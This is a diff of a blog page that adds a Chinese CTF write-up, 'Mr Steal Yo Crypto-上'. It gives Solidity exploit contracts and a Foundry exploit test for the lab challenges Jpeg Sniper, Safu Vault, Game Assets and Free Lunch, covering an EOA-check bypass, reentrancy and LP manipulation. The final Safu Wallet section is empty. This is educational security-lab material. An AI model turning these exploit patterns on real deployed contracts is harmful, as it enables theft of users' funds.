@@ -4,8 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Uniswap V2, Blog">
-    <meta name="description" content="">
+    <meta name="keywords" content="Mr Steal Yo Crypto-上, Blog">
+    <meta name="description" content="Mr Steal Yo Crypto-上Jpeg Sniper我们如果想要铸造nft，仅能通过publicSaleMint方法，但是一个地址最多只能铸造5个代币。
+publicSaleMint方法有一个修饰符isEOA()，绕过她十分简单，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Uniswap V2 | Blog</title>
+    <title>Mr Steal Yo Crypto-上 | Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -282,12 +283,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Uniswap V2</h1>
+                    <h1 class="description center-align post-title">Mr Steal Yo Crypto-上</h1>
                 </div>
             </div>
         </div>
@@ -311,8 +312,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%BA%94%E7%94%A8/">
-                                <span class="chip bg-color">应用</span>
+                            <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">智能合约安全</span>
                             </a>
                         
                     </div>
@@ -336,28 +337,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-03-18
+                    2023-03-09
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-18
+                    2023-09-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    825
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
 
@@ -377,7 +378,207 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="Mr-Steal-Yo-Crypto-上"><a href="#Mr-Steal-Yo-Crypto-上" class="headerlink" title="Mr Steal Yo Crypto-上"></a>Mr Steal Yo Crypto-上</h1><h2 id="Jpeg-Sniper"><a href="#Jpeg-Sniper" class="headerlink" title="Jpeg Sniper"></a>Jpeg Sniper</h2><p>我们如果想要铸造nft，仅能通过publicSaleMint方法，但是一个地址最多只能铸造5个代币。</p>
+<p>publicSaleMint方法有一个修饰符isEOA()，绕过她十分简单，只要在构造函数中调用即可。</p>
+<p>那么想要在一次交易中完成，就要有主次两个合约。主合约批量构造次合约，次合约调用publicSaleMint方法。</p>
+<pre><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "./FlatLaunchpeg.sol";
+
+contract A{
+    address NFT;
+    address attacker;
+    constructor(address _NFT,address _attacker){
+        NFT = _NFT;
+        attacker = _attacker;
+        mint();
+    }
+
+    function mint() public {
+        uint per = 5;
+
+        for(uint amount = 0;amount&lt;=60;){
+            new a(NFT,attacker,per,amount);
+            amount = amount+5;
+        }
+        new a(NFT,attacker,4,65);
+    }
+}
+
+contract a{
+    constructor(address _nft,address attacker,uint per,uint amount){
+        FlatLaunchpeg nft = FlatLaunchpeg(_nft);
+        nft.publicSaleMint(per);
+        for(uint i = 0;i&lt;per;i++){
+            nft.transferFrom(address(this), attacker, amount+i);
+        }
+    }
+}
+</code></pre>
+<h2 id="Safu-Vault"><a href="#Safu-Vault" class="headerlink" title="Safu Vault"></a>Safu Vault</h2><p>我们可以看到depositFor()它与deposit()几乎是相同的实现，但是在depositFor()中token是作为参数被输入的，这是一个严重的漏洞。</p>
+<p>我们可以随意的构造safeTransferFrom()。比如在safeTransferFrom()中调用depositFor()进行重入攻击。</p>
+<pre><code>function transferFrom(
+    address from,
+    address to,
+    uint256 _amount
+) public returns (bool) {
+    if (count &lt; reentrancy_count) {
+        count++;
+        safuVault.depositFor(address(this), uint256(0), owner);
+        usdc.transfer(address(safuVault), amount);
+    }
+    return true;
+}
+</code></pre>
+<h2 id="Game-Assets"><a href="#Game-Assets" class="headerlink" title="Game Assets"></a>Game Assets</h2><p>AssetWrapper合约可以随意使用用户的NFT因为</p>
+<pre><code>// set operator of the two game assets to be the wrapper contract
+        vm.prank(admin);
+        swordAsset.setOperator(address(assetWrapper));
+        vm.prank(admin);
+        shieldAsset.setOperator(address(assetWrapper));
+</code></pre>
+<p>本题的漏洞在于AssetWrapper合约的wrap()方法。</p>
+<p>在wrap()中采用了铸造assetWrapper代币，再验证的模式，这是十分不合理的。</p>
+<p>当mint时会触发_doSafeBatchTransferAcceptanceCheck()。这个方法中存在外部调用。</p>
+<pre><code>try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response)
+</code></pre>
+<p>这时我们销毁assetWrapper代币，AssetWrapper合约便会将NFT发给我们。</p>
+<pre><code>    //SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.4;
+    import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
+    interface AssertWrap{
+        function wrap(
+            uint256 nftId,
+            address assetOwner,
+            address assetAddress
+        ) external;
+        function unwrap(
+            address assetOwner,
+            address assetAddress
+        ) external;
+    }
+
+    contract Attack{
+
+        address assertWarp;
+        address nft1;
+        address nft2;
+        int count = 0 ;
+
+        constructor(address _warp,address token1,address token2) public{
+            assertWarp = _warp;
+            nft1 = token1;
+            nft2 = token2;
+        }
+
+        function attack() public {
+            AssertWrap(assertWarp).wrap(0,address(this),nft1);
+            AssertWrap(assertWarp).wrap(0,address(this),nft2);
+        }
+
+        function onERC1155Received(
+            address operator,
+            address from,
+            uint256 id,
+            uint256 value,
+            bytes calldata data
+        ) external returns (bytes4){
+            if(count == 0){
+            AssertWrap(assertWarp).unwrap(address(this), nft1);
+            count++;
+            return IERC1155Receiver.onERC1155Received.selector;}
+
+            AssertWrap(assertWarp).unwrap(address(this), nft2);
+
+
+            return IERC1155Receiver.onERC1155Received.selector;
+        }
+    }
+</code></pre>
+<h2 id="Free-Lunch"><a href="#Free-Lunch" class="headerlink" title="Free Lunch"></a>Free Lunch</h2><p>SafuMakerV2可以将所有的代币转化成SAFU,并在将来分给xSAFU的持有者。</p>
+<pre><code>safuPair.transfer(address(safuMaker),10_000e18); // 1% of LP
+</code></pre>
+<p>我们可看到safuMaker中有10000的(USDC-SAFU)LP。那我们是否可以建一个(USDC-SAFU)-SAFU的Pool呢？</p>
+<pre><code>/// solves the challenge
+
+function testChallengeExploit()
+public
+{
+    vm.startPrank(attacker, attacker);
+
+   //搞一点(USDC-SAFU)的LP
+    usdc.approve(address(safuRouter), type(uint).max);
+    safu.approve(address(safuRouter), type(uint).max);
+    safuRouter.addLiquidity(
+        address(usdc),
+        address(safu),
+        80e18,
+        80e18,
+        0,
+        0,
+        attacker,
+        block.timestamp
+    );
+   
+    safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc), address(safu)));
+
+    //建立以个(USDC-SAFU)-SAFU的Pool，并添加流动性。
+    safuPair.approve(address(safuRouter), type(uint).max);
+    safuRouter.addLiquidity(
+        address(safuPair),
+        address(safu),
+        safuPair.balanceOf(attacker),
+        5e18,
+        0,
+        0,
+        address(attacker),
+        block.timestamp
+    );
+   
+    IUniswapV2Pair sifuPair = IUniswapV2Pair(safuFactory.getPair(address(safuPair), address(safu)));
+
+    //往safuMaker随意转一点。
+    sifuPair.transfer(address(safuMaker), 1e18);
+    
+    /*
+    本题的关键就在convert()方法中。
+
+    safuMaker会将自己所有的代币转化成SAFU，
+    这在(USDC-SAFU)-SAFU的Pool会有大量的(USDC-SAFU)LP，
+    这时我们移除(USDC-SAFU)-SAFU流动性会获得大量的(USDC-SAFU)LP,
+    我们再在USDC-SAFU的Pool中移除流动性即可。
+    */
+
+    safuMaker.convert(address(safuPair), address(safu));
+
+   
+    sifuPair.approve(address(safuRouter), type(uint).max);
+    safuRouter.removeLiquidity(
+        address(safuPair),
+        address(safu),
+        sifuPair.balanceOf(attacker),
+        0,
+        0,
+        address(attacker),
+        block.timestamp
+    );
+   
+    safuRouter.removeLiquidity(
+        address(usdc),
+        address(safu),
+        safuPair.balanceOf(attacker),
+        0,
+        0,
+        address(attacker),
+        block.timestamp
+    );
+
+    vm.stopPrank();
+    validation();
+}
+</code></pre>
+<h2 id="Safu-Wallet"><a href="#Safu-Wallet" class="headerlink" title="Safu Wallet"></a>Safu Wallet</h2>
                 
             </div>
             <hr/>
@@ -403,7 +604,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://willcking.github.io/2023/03/18/Uniswap-V2/">https://willcking.github.io/2023/03/18/Uniswap-V2/</a>
+                    <a href="https://willcking.github.io/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8A/">https://willcking.github.io/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8A/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -441,8 +642,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%BA%94%E7%94%A8/">
-                                    <span class="chip bg-color">应用</span>
+                                <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">智能合约安全</span>
                                 </a>
                             
                         </div>
@@ -525,13 +726,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/03/19/capture-the-ether-%E4%B8%8A/">
+                <a href="/2023/03/09/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="capture the ether(上)">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Damn-Defi-题解（下）">
                         
-                        <span class="card-title">capture the ether(上)</span>
+                        <span class="card-title">Damn-Defi-题解（下）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -542,7 +743,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-19
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-09
                         </span>
                         <span class="publish-author">
                             
@@ -574,13 +775,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/03/09/Damn-Defi-%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%8B%EF%BC%89/">
+                <a href="/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8B/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Damn-Defi-题解（下）">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Mr Steal Yo Crypto-下">
                         
-                        <span class="card-title">Damn-Defi-题解（下）</span>
+                        <span class="card-title">Mr Steal Yo Crypto-下</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -840,7 +1041,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">7.2k</span>
+                        class="white-color">8k</span>
             
             
             
